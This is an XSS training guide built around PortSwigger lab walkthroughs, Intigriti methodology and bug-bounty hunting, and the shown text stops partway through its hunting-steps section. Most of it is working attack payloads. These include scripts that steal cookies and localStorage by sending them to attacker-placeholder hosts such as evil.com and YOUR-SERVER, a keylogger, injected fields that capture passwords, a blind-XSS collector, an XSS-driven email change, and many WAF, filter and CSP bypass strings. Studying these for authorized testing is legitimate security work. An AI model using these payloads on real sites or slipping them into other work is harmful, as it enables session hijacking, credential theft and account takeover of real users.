# XSS — Complete One-Stop Guide
### zerach | PortSwigger Web Security Academy + Intigriti Hackademy | June 2026

> **How to use this guide:** Read the concept → do the labs → check the hunting methodology → go live.
> Don't finish all labs before hunting. After each section, open HackerOne and test that specific technique.

---

## Table of Contents

1. [What is XSS — Plain English](#1-what-is-xss--plain-english)
2. [The 3 Types — Know the Difference](#2-the-3-types--know-the-difference)
3. [XSS Contexts — The Most Important Concept](#3-xss-contexts--the-most-important-concept)
4. [All PortSwigger Labs — Full Walkthroughs](#4-all-portswigger-labs--full-walkthroughs)
5. [Exploiting XSS for Real Impact](#5-exploiting-xss-for-real-impact)
6. [Blind XSS — Intigriti's Favourite](#6-blind-xss--intigritis-favourite)
7. [WAF & Filter Bypass Techniques](#7-waf--filter-bypass-techniques)
8. [CSP — What It Is and How to Bypass It](#8-csp--what-it-is-and-how-to-bypass-it)
9. [Intigriti Hackademy — XSS Methodology](#9-intigriti-hackademy--xss-methodology)
10. [Bug Bounty Hunting Methodology](#10-bug-bounty-hunting-methodology)
11. [Payload Cheat Sheet](#11-payload-cheat-sheet)
12. [Tools & Resources](#12-tools--resources)

---

## 1. What is XSS — Plain English

XSS (Cross-Site Scripting) lets you inject JavaScript into a web page that runs in someone else's browser.

**The damage:**
- Steal session cookies → log in as the victim
- Perform actions on the victim's behalf (change email, make payments)
- Capture keystrokes (passwords typed on the page)
- Redirect the victim to a phishing page
- Full account takeover

**Why it matters for bounties:**
- XSS is #3 in the OWASP Top 10
- Stored XSS on sensitive pages = High/Critical
- Reflected XSS = Medium (Low if self-only)
- Chained with CSRF or OAuth = Critical

---

## 2. The 3 Types — Know the Difference

### Reflected XSS
Your payload is in the URL → server sends it back immediately → victim's browser runs it.

```
Example:
https://site.com/search?q=<script>alert(1)</script>
Server response: <p>Results for: <script>alert(1)</script></p>
```

**How victim gets hit:** You send them the crafted URL. They click it. It fires once.

**Where to find it:** Search fields, error messages, URL parameters that appear in the page.

---

### Stored XSS (Persistent XSS)
Your payload is saved in the database → every user who loads that page gets hit automatically.

```
Example:
Comment posted: <script>fetch('https://evil.com/?c='+document.cookie)</script>
Every visitor to that page: their cookies get sent to you.
```

**Why it pays more:** You don't need to trick a victim into clicking a link. It fires on everyone automatically.

**Where to find it:** Comment sections, profile fields (username, bio, address), product reviews, forum posts, support tickets, chat messages.

---

### DOM-Based XSS
The payload never goes to the server. JavaScript on the page reads it from the URL (or other source) and writes it directly into the DOM unsafely.

```javascript
// Vulnerable JS code on the page:
var search = location.search.split('q=')[1];
document.getElementById('results').innerHTML = search;  // SINK

// Attack URL:
https://site.com/?q=<img src=x onerror=alert(1)>
```

**Key terms:**
- **Source:** Where attacker-controlled data comes from (`location.search`, `location.hash`, `document.referrer`, `postMessage`)
- **Sink:** Dangerous function that writes data (`innerHTML`, `document.write`, `eval`, `setTimeout`)

**How to find it:** Dev tools → Sources → search the JS for `innerHTML`, `document.write`, `eval`. Use DOM Invader (Burp's browser extension).

---

## 3. XSS Contexts — The Most Important Concept

When you find a reflection, you must figure out **where** your input lands in the HTML. Different contexts need different payloads.

### Context 1: Between HTML Tags
Your input appears as raw text between tags.

```html
<p>Hello zerach</p>  ← your input is "zerach"
```

**Payload:** Inject a new tag.
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

---

### Context 2: Inside an HTML Attribute
Your input is inside a tag attribute value.

```html
<input value="zerach">  ← your input is "zerach"
```

**Payload option A:** Break out of the attribute and tag, inject new tag.
```html
"><script>alert(1)</script>
```
Result: `<input value=""><script>alert(1)</script>`

**Payload option B:** Stay inside the tag, inject an event handler.
```html
" autofocus onfocus=alert(1) x="
```
Result: `<input value="" autofocus onfocus=alert(1) x="">`

---

### Context 3: Inside `href` Attribute (Anchor Tags)
```html
<a href="zerach">Link</a>
```

**Payload:** Use the `javascript:` pseudo-protocol.
```html
javascript:alert(document.domain)
```
Result: `<a href="javascript:alert(document.domain)">Link</a>` — fires when user clicks.

---

### Context 4: Inside a JavaScript String
Your input lands inside a JS variable.

```javascript
var name = 'zerach';  ← your input is "zerach"
```

**Payload:** Break out of the string.
```javascript
'-alert(1)-'
';alert(1)//
```
Result: `var name = ''-alert(1)-'';`  (arithmetic trick, no syntax error)

**If single quotes are escaped with `\`:**
The app turns `'` into `\'`. But if you inject `\'`, the app turns it into `\\'`. Now the backslash escapes itself, and the quote closes the string:
```
Input: \';alert(1)//
After escaping: \\';alert(1)//
JS sees: \\ as a literal backslash, then ' closes the string ✓
```

---

### Context 5: Inside a JavaScript Template Literal (backtick)
```javascript
var msg = `Welcome zerach`;
```

**Payload:** Use `${...}` syntax — no need to break out.
```javascript
${alert(document.domain)}
```
Result: `` `Welcome ${alert(document.domain)}` `` — expression evaluates and fires.

---

### Context 6: Inside a `<script>` Block
Your input is inside a script block but not inside a string.

```html
<script>
  var data = 'zerach';
</script>
```

**Payload:** Close the script tag, open a new one.
```html
</script><img src=x onerror=alert(1)>
```
The browser parses HTML first, so `</script>` closes the block even mid-string. The `<img>` fires separately.

---

## 4. All PortSwigger Labs — Full Walkthroughs

> **Note on PoC:** From Chrome 92+, `alert()` is blocked in cross-origin iframes. Use `print()` instead where instructed by the lab. Both are accepted as PoC.

---

### APPRENTICE LABS

---

#### Lab 1 — Reflected XSS into HTML context with nothing encoded
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

**Concept:** Most basic reflected XSS. No filtering. Input goes straight into HTML.

**Step-by-step:**
1. Open the lab, use the search box.
2. Type: `test123` — see it reflected in the page source.
3. The input lands between HTML tags (context 1).
4. Submit payload:
```html
<script>alert(1)</script>
```
5. Alert fires. Lab solved.

**What you learned:** Input reflected in HTML context = inject a `<script>` tag.

---

#### Lab 2 — Stored XSS into HTML context with nothing encoded
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

**Concept:** Basic stored XSS. Comment field saves your payload and displays it to everyone.

**Step-by-step:**
1. Open a blog post.
2. In the **Comment** field, enter:
```html
<script>alert(1)</script>
```
3. Fill in required fields (Name, Email), submit the comment.
4. Navigate back to the blog post.
5. Alert fires when the page loads (your stored payload executes). Lab solved.

**What you learned:** Any input stored and displayed without encoding = stored XSS.

---

#### Lab 3 — DOM XSS in `document.write` sink using `location.search`
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

**Concept:** JS reads from `location.search` (source) and writes to DOM via `document.write` (sink).

**Step-by-step:**
1. Open the search box. Type anything, e.g. `test`.
2. View page source — find the JS that does `document.write(...)` with your input.
3. Your input lands inside an `<img src="...">` attribute.
4. Break out of the attribute:
```html
"><svg onload=alert(1)>
```
5. Alert fires. Lab solved.

**What you learned:** Find the sink in JS, understand what HTML context your input lands in, then break out.

---

#### Lab 4 — DOM XSS in `innerHTML` sink using `location.search`
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

**Concept:** JS reads the search param and sets `innerHTML`. Script tags don't work in innerHTML.

**Step-by-step:**
1. Search for anything. View source — find `element.innerHTML = searchTerm`.
2. `<script>` tags don't execute when set via innerHTML (browser restriction).
3. Use an event-based payload instead:
```html
<img src=x onerror=alert(1)>
```
4. Alert fires. Lab solved.

**What you learned:** `innerHTML` blocks `<script>` tags. Always use event handlers (`onerror`, `onload`, `onfocus`) for innerHTML sinks.

---

#### Lab 5 — DOM XSS in jQuery anchor `href` attribute sink using `location.search`
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

**Concept:** jQuery reads a URL parameter and sets it as the `href` of a link.

**Step-by-step:**
1. Notice the "Back" link. Check its URL: `?returnPath=/`.
2. Change `returnPath` to a javascript: URL:
```
?returnPath=javascript:alert(document.cookie)
```
3. Click the "Back" link.
4. Alert fires. Lab solved.

**What you learned:** `href` sinks accept `javascript:` protocol payloads. Always test URL params that end up in links.

---

#### Lab 6 — DOM XSS in jQuery selector sink using a hashchange event
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

**Concept:** jQuery uses `location.hash` to select an element using `$(...)`. Attackers can pass HTML.

**Step-by-step:**
1. View the page source. Find jQuery code like: `$(window.location.hash)` inside a hashchange handler.
2. `$(...)` in jQuery can accept HTML strings and execute them.
3. The exploit needs to be delivered via an iframe (to control the hash and trigger hashchange):
```html
<iframe src="https://YOUR-LAB.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
4. Host this on the exploit server, deliver to victim. `print()` fires. Lab solved.

**What you learned:** jQuery's `$()` selector is dangerous when fed user input. Hash-based sinks need iframe delivery.

---

#### Lab 7 — Reflected XSS into attribute with angle brackets HTML-encoded
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

**Concept:** `<` and `>` are encoded, so you can't inject new tags. But you're inside an attribute — inject a new event handler.

**Step-by-step:**
1. Search for `test` — view source. Your input lands in: `<input value="test">`.
2. Try `<script>` — angle brackets get encoded. You're stuck inside the attribute.
3. Inject a new attribute with an event handler:
```html
" autofocus onfocus=alert(1) x="
```
4. Page loads, the input auto-focuses, `onfocus` fires. Alert appears. Lab solved.

**What you learned:** When angle brackets are blocked, stay inside the tag and add event handlers.

---

#### Lab 8 — Stored XSS into anchor `href` attribute with double quotes HTML-encoded
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

**Concept:** Website field saves URL into an `href`. Double quotes encoded, but `javascript:` still works.

**Step-by-step:**
1. Post a comment. In the **Website** field, enter:
```
javascript:alert(1)
```
2. Submit the comment.
3. Navigate back to the post. Click the commenter's name (it's a link with your href).
4. Alert fires. Lab solved.

**What you learned:** The `href` attribute directly accepts `javascript:` — no brackets needed.

---

#### Lab 9 — Reflected XSS into JavaScript string with angle brackets HTML-encoded
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

**Concept:** Input reflected inside a JS string. Angle brackets encoded, but quotes aren't.

**Step-by-step:**
1. Search for `test` — view source. Find: `var searchTerms = 'test';`
2. Angle brackets are encoded. But single quotes work.
3. Break out of the string:
```javascript
'-alert(1)-'
```
4. Result: `var searchTerms = ''-alert(1)-'';` — valid JS, alert fires. Lab solved.

**What you learned:** JS string context → break with `'`, use arithmetic `-` to avoid syntax errors.

---

### PRACTITIONER LABS

---

#### Lab 10 — DOM XSS in `document.write` sink inside a `select` element
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

**Concept:** Input lands inside a `<select>` element via `document.write`. Close the select, inject script.

**Step-by-step:**
1. Find the `storeId` parameter (appended to URL on product page).
2. View source — JS writes `storeId` value into a `<select>` element.
3. Inject to break out of the select:
```html
"></select><img src=x onerror=alert(1)>
```
Add to URL: `?productId=1&storeId="></select><img src=x onerror=alert(1)>`
4. Alert fires. Lab solved.

---

#### Lab 11 — DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

**Concept:** Page uses AngularJS (`ng-app`). AngularJS evaluates `{{expressions}}` inside the template.

**Step-by-step:**
1. Notice `ng-app` on the `<body>` tag.
2. Search field — your input goes inside the AngularJS template.
3. Angle brackets and quotes are encoded, but AngularJS expressions still evaluate.
4. Payload:
```
{{constructor.constructor('alert(1)')()}}
```
5. AngularJS evaluates the expression and calls `alert(1)`. Lab solved.

**What you learned:** If a page uses AngularJS, `{{}}` expressions bypass HTML encoding entirely.

---

#### Lab 12 — Reflected XSS into HTML context with most tags and attributes blocked
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

**Concept:** WAF blocks most tags and events. Need to find what's allowed.

**Step-by-step:**
1. Search for `<img>` — get 400 "Tag Not Allowed".
2. Open Burp Intruder. Payload position on the tag name:
```
<§§>
```
3. Paste the PortSwigger XSS cheat sheet tag list as payloads (https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
4. Run attack. Find which tag returns 200 (not blocked). e.g. `<body>`.
5. Now fuzz event handlers on that tag:
```
<body §§=1>
```
6. From the cheat sheet, find which event works (e.g. `onresize`).
7. Final payload using exploit server to deliver iframe:
```html
<iframe src="https://YOUR-LAB.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'>
```
8. Deliver via exploit server. Victim resizes → `print()` fires. Lab solved.

---

#### Lab 13 — Reflected XSS into HTML context with all tags blocked except custom ones
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

**Concept:** All standard tags blocked but custom HTML elements are allowed.

**Step-by-step:**
1. Test `<script>` — blocked. Test `<xss>` (custom tag) — not blocked.
2. Custom tags can have `onfocus` + `autofocus`, or `tabindex` to make them focusable.
3. Payload:
```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```
The `#x` in the URL makes the browser focus the element on load.
4. Full URL:
```
https://YOUR-LAB.web-security-academy.net/?search=<xss+id=x+onfocus=alert(document.cookie)+tabindex=1>#x
```
5. Alert fires. Lab solved.

---

#### Lab 14 — Reflected XSS with some SVG markup allowed
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

**Concept:** Most tags blocked. SVG tags pass through.

**Step-by-step:**
1. Fuzz tags — find `<svg>`, `<animatetransform>`, etc. are allowed.
2. Fuzz events on allowed tags — find `onbegin` is allowed.
3. Payload:
```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
4. Alert fires. Lab solved.

---

#### Lab 15 — Reflected XSS in canonical link tag
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

**Concept:** Input reflected inside a hidden `<link rel="canonical">` tag. Can't inject event handlers normally. Use `accesskey`.

**Step-by-step:**
1. View source — your input from the URL appears in: `<link rel="canonical" href="https://site.com/?YOUR_INPUT"/>`.
2. Angle brackets encoded, so can't escape the tag. But you can inject new attributes.
3. Payload (inject into URL):
```
'accesskey='x'onclick='alert(1)
```
Full URL: `https://YOUR-LAB.web-security-academy.net/?'accesskey='x'onclick='alert(1)`
4. Press `Alt+Shift+X` (Windows/Linux) or `Ctrl+Alt+X` (Mac) to trigger the access key.
5. Alert fires. Lab solved.

**Note:** Access key exploits require user interaction. This is typically reported as a lower-severity XSS.

---

#### Lab 16 — Reflected XSS into JavaScript string with single quote and backslash escaped
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

**Concept:** `'` → `\'` and `\` → `\\`. Can't break string directly. Break out of the script block instead.

**Step-by-step:**
1. Search for `test'` — see it becomes `test\'` in source. Single quotes escaped.
2. Escaping quotes doesn't help here. But: the script block itself can be terminated.
3. Payload: close the script block, add new tag:
```html
</script><img src=x onerror=alert(1)>
```
4. Result: The `</script>` closes the block (HTML parser handles this before JS parser). The `<img>` fires. Lab solved.

---

#### Lab 17 — Reflected XSS into JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

**Concept:** `'` → `\'`, `<` → `&lt;`, `"` → `&quot;`. Need to escape the backslash itself.

**Step-by-step:**
1. Test `\'` as input. App converts it to `\\'`. Now the backslash is escaped and the `'` closes the string.
2. Payload:
```
\'-alert(1)//
```
3. Result in source: `var x = '\\'-alert(1)//'` — JS sees `\\` as literal backslash, then `'` closes string. Alert fires. Lab solved.

---

#### Lab 18 — Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-single-quotes-and-backslash-escaped

**Concept:** Input lands inside an `onclick` attribute string. Single quotes and backslashes are escaped — but HTML encoding works here because browsers HTML-decode attributes before parsing JS.

**Step-by-step:**
1. Post a comment with website field. It appears as: `<a href="..." onclick="... 'YOUR_INPUT' ...">`
2. Single quotes are escaped. But we're in an HTML attribute — HTML entities decode before JS runs.
3. Use `&apos;` (HTML entity for `'`) to inject a quote that bypasses the filter:
```
http://test&apos;-alert(1)-&apos;
```
4. The browser decodes `&apos;` → `'` before running the JS. String breaks, alert fires. Lab solved.

---

#### Lab 19 — Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

**Concept:** Input is inside a JS template literal (backtick string). Everything escaped except `${...}`.

**Step-by-step:**
1. Search for `test`. View source: `` var greeting = `Hello test`; ``
2. Can't break out — backtick is escaped. But you're already inside a template literal.
3. Template literals evaluate `${...}` expressions automatically:
```
${alert(1)}
```
4. Result: `` `Hello ${alert(1)}` `` — expression evaluates, alert fires. Lab solved.

---

#### Lab 20 — Exploiting XSS to perform CSRF
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

**Concept:** Use a stored XSS to make the victim change their email address (CSRF via XSS).

**Step-by-step:**
1. Log in. Go to account settings. Observe the "Update email" form — it has a CSRF token.
2. We need XSS that reads the CSRF token from the page, then submits the form.
3. In a blog post comment, submit this payload:
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post','/my-account/change-email',true);
    changeReq.send('csrf='+token+'&email=zerach@evil.com');
};
</script>
```
4. When any user visits the blog post, the script runs, reads their CSRF token, and changes their email. Lab solved.

---

#### Lab 21 — Exploiting XSS to steal cookies
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

**Concept:** Steal session cookie using stored XSS → log in as the victim.

**Step-by-step:**
1. Go to a blog post. Post a comment with:
```html
<script>
fetch('https://BURP-COLLABORATOR-URL', {
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
</script>
```
2. Open Burp Collaborator (Burp Pro) or use https://app.interactsh.com.
3. When the victim views the post, their cookie is sent to your server.
4. Copy the cookie value → use it in Burp Repeater or browser dev tools to hijack the session. Lab solved.

---

#### Lab 22 — Exploiting XSS to capture passwords
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

**Concept:** Inject a fake password input field. Browser autofills with victim's saved credentials. Exfiltrate.

**Step-by-step:**
1. Comment on a blog post with:
```html
<input name=username id=username>
<input type=password name=password onchange="
if(this.value.length)fetch('https://BURP-COLLABORATOR-URL',{
method:'POST',
mode:'no-cors',
body:username.value+':'+this.value
});">
```
2. The hidden password field triggers `onchange` when the browser autofills.
3. Credentials are sent to Collaborator. Lab solved.

---

### EXPERT LABS

---

#### Lab 23 — Reflected XSS with event handlers and `href` attributes blocked and a CSP that allows no `unsafe-inline`
**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-all-scripts-blocked

**Concept:** CSP blocks inline scripts and event handlers. Need to inject an element using a `nonce` or JSONP-based bypass — or use `<base>` injection.

**Step-by-step:**
1. Check the CSP header: look for `script-src` directives and allowed domains.
2. Try injecting `<base href="https://evil.com">` — this makes all relative script imports load from your server.
3. Alternatively, look for a CSP policy that allows a specific domain with a JSONP endpoint:
```html
"><script src="https://allowed-cdn.com/jsonp?callback=alert(1)"></script>
```
4. Or use an AngularJS sandbox escape if AngularJS is whitelisted in the CSP.

**Note:** The exact bypass depends on the CSP in the specific lab. The approach: read the CSP → find a weakness (wildcard, JSONP endpoint, file:// allowance, Angular, base-uri missing).

---

#### Lab 24 — Reflected XSS protected by very strict CSP, with dangling markup attack
**Concept:** CSP prevents XSS execution. Use dangling markup to leak the CSRF token instead.

**Step-by-step:**
1. CSP is strict — can't run JS. But input is reflected in the page.
2. Inject an unclosed `<img src="https://evil.com?leak=` tag.
3. The browser tries to load the image. Everything until the next `"` in the page becomes the URL (including the CSRF token in the page).
4. You receive the CSRF token via the image request to your server.
5. Use the leaked CSRF token to forge a request separately. Lab solved.

---

## 5. Exploiting XSS for Real Impact

In bug bounties, `alert(1)` is PoC. **Real impact** is what gets you paid more.

### Cookie Theft
```javascript
// Send cookies to your server
fetch('https://YOUR-SERVER/?c='+document.cookie, {mode:'no-cors'});

// Or redirect
document.location='https://YOUR-SERVER/?c='+document.cookie;
```

### Session Hijacking (using stolen cookie)
1. Get cookie from Collaborator/Interactsh callback.
2. In browser DevTools → Application → Cookies → set the session cookie to stolen value.
3. Refresh. You're logged in as the victim.

### Perform Actions as the Victim (XSS + CSRF)
```javascript
// Change email without victim's knowledge
fetch('/account/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil.com&csrf=' + document.querySelector('[name=csrf]').value
});
```

### Keylogger
```javascript
document.addEventListener('keypress', function(e) {
  fetch('https://YOUR-SERVER/?k=' + e.key, {mode:'no-cors'});
});
```

### Exfiltrate Local Storage / IndexedDB
```javascript
fetch('https://YOUR-SERVER/?ls='+JSON.stringify(localStorage), {mode:'no-cors'});
```

### Impact Escalation Cheat Sheet

| XSS Type | Base Severity | Chain To | Escalated Severity |
|---|---|---|---|
| Reflected | Low–Med | Phishing, oauth token steal | Medium–High |
| Stored (public page) | Medium | Cookie theft, keylogger | High |
| Stored (admin panel) | High | Admin account takeover | Critical |
| XSS + CSRF | Medium | Email/password change | High–Critical |
| XSS on payment page | High | Card data theft | Critical |

---

## 6. Blind XSS — Intigriti's Favourite

Blind XSS is stored XSS where the payload fires on a **page you can't see** (admin panel, support dashboard, internal tool).

**Why it's valuable:** It fires for privileged users — admin accounts, support staff. Almost always High or Critical.

### Where to inject blind XSS payloads:
- Support ticket / contact forms
- User-agent header (`User-Agent: <script>...`)
- Referrer header
- Username / display name fields
- Address fields in checkout
- Feedback forms
- CSV imports that get viewed in an admin panel
- Log viewer inputs (search, error messages)
- Any field that says "an admin will review this"

### Tools for Blind XSS:
- **XSS Hunter Express** (self-hosted): https://github.com/mandatoryprogrammer/xsshunter-express
- **Interactsh** (free, easy): https://app.interactsh.com
- **Caido's Blind XSS** module

### Basic Blind XSS Payload
```html
<script src="https://YOUR-XSSHUNTER-SERVER/payload.js"></script>
```

### Intigriti's Recommended Blind XSS Payload Template
```javascript
// Load from your server — your server logs the callback with:
// URL, cookies, localStorage, DOM, screenshot
var a=document.createElement("script");
a.src="https://YOUR-SERVER/collect?u="+encodeURIComponent(document.location)
    +"&c="+encodeURIComponent(document.cookie)
    +"&r="+encodeURIComponent(document.referrer);
document.head.appendChild(a);
```

### Advanced: Exfiltrate DOM Content
```javascript
fetch('https://YOUR-SERVER/', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    url: document.location.href,
    cookies: document.cookie,
    storage: JSON.stringify(localStorage),
    dom: document.documentElement.innerHTML.substring(0, 5000)
  })
});
```

---

## 7. WAF & Filter Bypass Techniques

### Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

### Encoding Tricks
```html
<!-- HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- URL encoding (in URL context) -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double URL encoding -->
%253Cscript%253E

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### Event Handler Alternatives (when `onerror` is blocked)
```html
<img src=x onmouseover=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<video autoplay onplay=alert(1) src=x>
<svg onload=alert(1)>
<math href="javascript:alert(1)">click</math>
```

### No Parentheses (when `(` and `)` are filtered)
```javascript
// throw with exception handler
onerror=alert;throw 1

// Tagged template literal
alert`1`

// With backtick bypass
String.fromCharCode`97,108,101,114,116`.split`,`.map(Number).map(String.fromCharCode).join``
```

### No Angle Brackets (attribute injection context)
```html
" onmouseover="alert(1)" foo="
" autofocus onfocus="alert(1)
```

### Bypass `javascript:` filter
```
javascript:alert(1)
jaVasCriPt:alert(1)
java&#115;cript:alert(1)
javascript&#58;alert(1)
&#106;avascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Breaking Filters That Strip `<script>`
```html
<!-- Filter removes <script> once, leaving: -->
<sc<script>ript>alert(1)</sc</script>ript>
→ after strip: <script>alert(1)</script> ✓
```

### Mutation XSS (mXSS) — Advanced
Browser HTML parsers sometimes "mutate" sanitized HTML back into XSS:
```html
<!-- Appears safe after sanitizer, mutates in browser: -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

## 8. CSP — What It Is and How to Bypass It

**Content Security Policy (CSP)** is a response header that tells the browser what scripts are allowed to run.

```
Content-Security-Policy: script-src 'self' 'nonce-abc123'
```

### Understanding CSP Directives
| Directive | Meaning |
|---|---|
| `script-src 'self'` | Only scripts from same origin |
| `script-src 'unsafe-inline'` | Allows inline `<script>` tags (weak CSP) |
| `script-src 'nonce-XYZ'` | Only scripts with matching nonce attribute |
| `script-src 'unsafe-eval'` | Allows `eval()` |
| `default-src 'none'` | Deny everything by default |

### How to Check CSP
- Browser DevTools → Network → Response Headers → `Content-Security-Policy`
- Or: https://csp-evaluator.withgoogle.com

### Common CSP Bypasses

**1. Whitelisted CDN with JSONP:**
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```
If `accounts.google.com` is in the whitelist and has a JSONP endpoint, it executes your callback.

**2. AngularJS + whitelisted domain:**
If AngularJS is loaded from a whitelisted CDN:
```html
<script src="https://whitelisted-cdn.com/angular.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

**3. Base tag injection (missing `base-uri` directive):**
```html
<base href="https://evil.com/">
```
Relative script imports now load from your server.

**4. Dangling markup (when XSS execution is blocked):**
Inject unclosed tags to leak tokens (see Lab 24 above).

**5. Nonce reuse / predictable nonce:**
If the nonce is static or predictable, you can include it in your injected script:
```html
<script nonce="LEAKED_NONCE">alert(1)</script>
```

**6. CSP injection via user-controlled header:**
If your input ends up in the CSP header itself:
```
Content-Security-Policy: script-src 'nonce-YOUR_INPUT'
Inject: abc'; script-src 'unsafe-inline
```

---

## 9. Intigriti Hackademy — XSS Methodology

**Source:** https://www.intigriti.com/researchers/hackademy/cross-site-scripting-xss
**Advanced guide (Oct 2025):** https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-reflected-xss-vulnerabilities

### Intigriti's 3-Step Methodology

#### Step 1: Find Reflection Points
Insert a unique marker (`intigriti1337test`) in every input:
- URL parameters
- POST body fields
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- Cookies
- JSON body fields
- Hidden form fields

Then search the HTTP response for your marker. This maps **where your input goes**.

#### Step 2: Understand the Injection Context
Once you find a reflection, determine:
1. Is it in HTML? Between tags? Inside an attribute?
2. Is it in JavaScript? Inside a string? A template literal?
3. Is there any encoding applied? (check what characters survive)

Test probe characters one by one:
```
< > " ' ` \ / ; : ( ) { }
```
See which ones pass through unencoded.

#### Step 3: Craft Payload for the Context
Pick the right payload based on what you found in steps 1 and 2. Use the context table in Section 3 above.

### Intigriti's Key Insight: Self-XSS vs Exploitable XSS
Self-XSS (fires only for you) is typically out-of-scope or informational. To escalate:
- Can it be triggered via a URL someone else clicks? → Reflected XSS report.
- Can it be persisted in the DB and shown to others? → Stored XSS report.
- Can it be combined with CSRF to force the injection? → Chain and escalate.

### Intigriti XSS Challenges
Practice real-world filter bypasses here:
- **Challenge hub:** https://www.intigriti.com/researchers/hackademy/xss-challenges
- Monthly challenges posted — solve them to practice advanced bypass techniques (DOM clobbering, mutation XSS, prototype pollution chained with XSS, CSP bypasses).
- Past challenge writeups on the Intigriti blog — read these even if you can't solve them.

---

## 10. Bug Bounty Hunting Methodology

### Step 1: Recon — Map All Input Points
Before testing anything, map every place input enters the app:

```bash
# Crawl with katana or gau for parameter discovery
katana -u https://target.com -jc -o params.txt
gau target.com | grep '=' | sort -u > urls.txt

# Find reflected params with gf
cat urls.txt | gf xss | tee xss-candidates.txt
```

Input types to check:
- URL query parameters (`?q=`, `?search=`, `?name=`)
- URL path segments (`/user/NAME/profile`)
- POST body fields (JSON, form-encoded)
- HTTP headers (User-Agent, Referer, X-Forwarded-For, Origin)
- Cookies
- File upload filenames
- JSON keys (not just values)
- WebSocket messages

---

### Step 2: Find Reflections
For each parameter, inject your unique marker:
```
intigriti1337zerachXSS
```
Check response: is it reflected? In what context?

Use Burp Suite:
- Proxy → Intercept all responses
- Engagement Tools → Search for your marker

---

### Step 3: Determine the Context
View page source (not DevTools — DevTools shows the rendered DOM, not the raw reflection).

Ask yourself:
1. Is my input between HTML tags? → Context 1
2. Is my input inside `value="..."` or similar? → Context 2
3. Is my input in `href="..."`? → Context 3
4. Is my input in a `<script>` block? → Context 4 or 5 or 6
5. Is my input processed by JS client-side? → DOM XSS

---

### Step 4: Test Characters
```
"><'`;/\
```
Send each. See what gets encoded, what passes through. This tells you which payloads to try.

---

### Step 5: Try Context-Appropriate Payloads

Use the cheat sheet in Section 11. Start simple, escalate if filters block you.

**Burp Suite workflow:**
1. Send the reflected request to Repeater.
2. Try payloads manually and watch the response.
3. Once XSS fires in Repeater, reproduce in browser.
4. Escalate payload to cookie theft or account takeover.

---

### Step 6: Bypass If Filtered
If simple payloads are blocked:
1. Test what's blocked: tag names? event names? keywords like `script`? `alert`?
